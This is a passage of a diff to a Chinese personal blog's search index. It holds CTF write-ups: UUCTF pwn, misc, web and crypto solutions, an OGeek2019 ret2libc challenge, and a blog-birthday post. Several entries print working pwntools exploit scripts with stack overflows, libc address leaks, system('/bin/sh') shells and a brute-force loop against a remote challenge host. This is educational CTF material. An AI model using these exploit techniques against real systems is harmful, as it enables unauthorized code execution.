<span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
+<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UUCTF writeup</title>
+    <url>/2023/05/30/UUCTF%20writeup/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="UUCTF-writeup"><a href="#UUCTF-writeup" class="headerlink" title="UUCTF writeup"></a>UUCTF writeup</h1><h3 id="writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配"><a href="#writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配" class="headerlink" title="writer:Pr0b1em(小菜鸡二进制选手，目标全栈选手，不配)"></a>writer:Pr0b1em<del>(小菜鸡二进制选手，目标全栈选手，不配)</del></h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>下载附件，先检查保护机制，只开了NX，64位文件</p>
+<p><img src="/img/1666613003904.png" alt="1666613003904"></p>
+<p>拖入IDA查看，分别查看main函数和字符串，找到关键字符串system和bin/sh，同时发现了vuln函数，继续跟进</p>
+<p><img src="/img/1666613080677.png" alt="1666613080677"></p>
+<p><img src="/img/1666613062494.png" alt="1666613062494"></p>
+<p><img src="/img/1666613139782.png" alt="1666613139782"></p>
+<p>发现buf此处，其中存在栈溢出，同时发现back_door函数，现成直接用 </p>
+<p><img src="/img/1666613319147.png" alt="1666613319147"></p>
+<p>构造脚本</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&quot;&quot;,)</span></span><br><span class="line">r=process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p><strong>花式栈溢出</strong></p>
+<p>检查保护机制，开了NX和PIE,说明基地址随机，估计得碰运气</p>
+<p><img src="/img/1666614235498.png" alt="1666614235498"></p>
+<p>IDA打开，发现内容和上一题几乎一样，唯独不同的点就是溢出空间只够一个后门函数的地址，于是撰写脚本，因为基地址为止，需要碰，所以脚本些许变化</p>
+<p><img src="/img/1666614380686.png" alt="1666614380686"></p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#p=process(&#x27;./babystack&#x27;)</span></span><br><span class="line">        p=remote(<span class="string">&quot;43.143.7.127&quot;</span>,<span class="number">28054</span>)</span><br><span class="line">        elf=ELF(<span class="string">&#x27;./easystack&#x27;</span>)</span><br><span class="line">        context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">        backdoor=<span class="number">0x1185</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="just-rce"><a href="#just-rce" class="headerlink" title="just rce"></a>just rce</h3><p>简单的rce，通过rev指令逆序输出就得到flag，后面配上通配符绕过关键字</p>
+<p><img src="/img/1666618211863.png" alt="1666618211863"></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Where-is-flag？"><a href="#Where-is-flag？" class="headerlink" title="Where is flag？"></a>Where is flag？</h3><p>流量分析，wireshark打开后导出特定分组http，发现有个flag压缩包，打开文件发现是png图片格式，010打开，这里发现缺少头文件，于是修复好，发现是个二维码，扫出来的内容存在零宽容度字符，在线网站解密得到flag。</p>
+<p><img src="/img/1666777976579.png" alt="1666777976579"></p>
+<h3 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h3><p>简单的解决，用ciphey，好一个三花淡奶！</p>
+<p><img src="/img/1666778096125.png" alt="1666778096125"></p>
+<h3 id="村中奇怪的故事"><a href="#村中奇怪的故事" class="headerlink" title="村中奇怪的故事"></a>村中奇怪的故事</h3><p>这玩意儿图片真给我误导了，没想到就是百家姓加密，后来仔细一看悟出来了，赶紧去试，后来七七上hint也验证了我的想法。说真的，这故事够狗屎，给我看得一愣一愣，解出来之后，居然平台后台flag还是错的，给我整得怀疑人生。</p>
+<h3 id="蜜蜂和蛆"><a href="#蜜蜂和蛆" class="headerlink" title="蜜蜂和蛆"></a>蜜蜂和蛆</h3><p>crc32爆破，通过pass1和pass2分别得到一段密码，然后打开得到一张画着蜜蜂和蛆的png，改宽高，得到一个二维码，扫出来base64解密，<del>文件都删完了，懒得复现了</del></p>
+<h3 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h3><p>让你跑你就跑，签个到！哈哈哈哈</p>
+<h3 id="略略略来抓我啊"><a href="#略略略来抓我啊" class="headerlink" title="略略略来抓我啊"></a>略略略来抓我啊</h3><p>社工还是不太擅长，很久没做过了，找了很久，第一张图暴露了一个钱塘驿，直接暴露了位置，然后就找着地图找宾馆，是个眼力活，也是个体力活</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h3><p>F12不管用？那我手动总行了吧！</p>
+<p><img src="/img/1666778791713.png" alt="1666778791713"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h3><p>兔子密码、社会主义核心价值观密码和栅栏密码，简单套娃</p>
+<h3 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h3><p>这个rsa有手就行，我直接用RsaCTFtools解的，脚本都懒得写了，这里就不放图复现了<del>（是真的懒</del></p>
+<h3 id="Easy-base64"><a href="#Easy-base64" class="headerlink" title="Easy_base64"></a>Easy_base64</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 这里有个固定的字符串是flag</span></span><br><span class="line"><span class="comment"># 1.根据flag的base64编码可以确定第一个字符的ASCII码对应的是90</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line">tmp = base64.b64encode(<span class="built_in">bytes</span>(flag,<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.根据结果往前推ASCII码</span></span><br><span class="line">a = [<span class="number">90</span>, <span class="number">55</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">34</span>, <span class="number">16</span>, <span class="number">50</span>,<span class="number">111</span>,<span class="number">74</span>, <span class="number">62</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">54</span>, <span class="number">52</span>,<span class="number">106</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">54</span>, <span class="number">24</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">11</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">54</span>, <span class="number">25</span>, <span class="number">111</span>, <span class="number">77</span>, <span class="number">16</span>, <span class="number">48</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">9</span>, <span class="number">55</span>, <span class="number">108</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)-<span class="number">1</span>):</span><br><span class="line">    t = a[i] ^ a[i+<span class="number">1</span>]</span><br><span class="line">    a[i+<span class="number">1</span>] = t</span><br><span class="line">    <span class="built_in">print</span>(t, end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">109,34,5,34,91,46,73,21,50,55,60,50,34,93,37,116,59,23,36,2,94,63,74,41,46,119,60,88,45,39,52,36,52,52,50,12,15,20,28,42,11,50,20,25,47,118,34,93,32,42,59,40,62,91,108,56</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b = [<span class="number">90</span>, <span class="number">109</span>,<span class="number">120</span>,<span class="number">104</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">116</span>,<span class="number">122</span>,<span class="number">97</span>,<span class="number">72</span>,<span class="number">86</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">115</span>,<span class="number">77</span>,<span class="number">72</span>,<span class="number">90</span>,<span class="number">108</span>,<span class="number">88</span>,<span class="number">50</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">78</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">71</span>,<span class="number">70</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">71</span>,<span class="number">86</span>,<span class="number">117</span>,<span class="number">90</span>,<span class="number">122</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">84</span>,<span class="number">78</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">81</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.解密</span></span><br><span class="line">a = <span class="string">b&#x27;ZmxhZ3tzaHVtdV9sMHZlX2gxNV9jaGFsbGVuZzNfdmVyOV9tdTNofQ==h&#x27;</span></span><br><span class="line">tmp = base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h3><p>这里考察的知识点就是当n不是由两个不相等的质数相乘得到的时的解法，属于另一种欧拉定理的运用，phin不再是(p-1)*(q-1)，而是p^3-p^2</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">#from flag import flag</span></span><br><span class="line"><span class="string">import libnum</span></span><br><span class="line"><span class="string">p=getPrime(1024)</span></span><br><span class="line"><span class="string">n=p**3</span></span><br><span class="line"><span class="string">e=65537</span></span><br><span class="line"><span class="string">flag=&#x27;flag&#123;luoxiheng&#125;&#x27;</span></span><br><span class="line"><span class="string">c=pow(libnum.s2n(flag),e,n)</span></span><br><span class="line"><span class="string">print(n)</span></span><br><span class="line"><span class="string">print(c)</span></span><br><span class="line"><span class="string">#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line"><span class="string">#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p = <span class="number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p**<span class="number">3</span></span><br><span class="line">phi_n= p**<span class="number">3</span>-p**<span class="number">2</span></span><br><span class="line">c=<span class="number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#print(binascii.unhexlify(hex(m)[2:]))</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">string = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>writeup</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -266,35 +266,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(OGeek2019)babyrop(ret2libc)</title>
-    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
-<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
-<p>IDA打开查看发现有随机数问题</p>
-<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
-<p>通过strncmp函数比较随机数与输入数是否相等</p>
-<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
-<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
-<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
-<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
-<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
-<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
-<p>这里选择泄露write_addr，然后计算出system_addr</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>最后脚本一跑，拿到了flag</p>
-<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bjdctf_2020_babyrop</title>
     <url>/2021/06/26/bjdctf-2020-babyrop/</url>
     <content><![CDATA[<span id="more"></span>
@@ -338,6 +309,48 @@
       </tags>
   </entry>
   <entry>
+    <title>(OGeek2019)babyrop(ret2libc)</title>
+    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
+<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
+<p>IDA打开查看发现有随机数问题</p>
+<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
+<p>通过strncmp函数比较随机数与输入数是否相等</p>
+<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
+<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
+<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
+<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
+<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
+<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
+<p>这里选择泄露write_addr，然后计算出system_addr</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后脚本一跑，拿到了flag</p>
+<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog诞生日2021.6.17</title>
+    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>canary</title>
     <url>/2021/12/20/canary/</url>
     <content><![CDATA[<span id="more"></span>
@@ -371,16 +384,43 @@
       </tags>
   </entry>
   <entry>
-    <title>blog诞生日2021.6.17</title>
-    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
+    <title>ciscn_2019_c_1</title>
+    <url>/2021/06/28/ciscn-2019-c-1/</url>
+    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
+<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
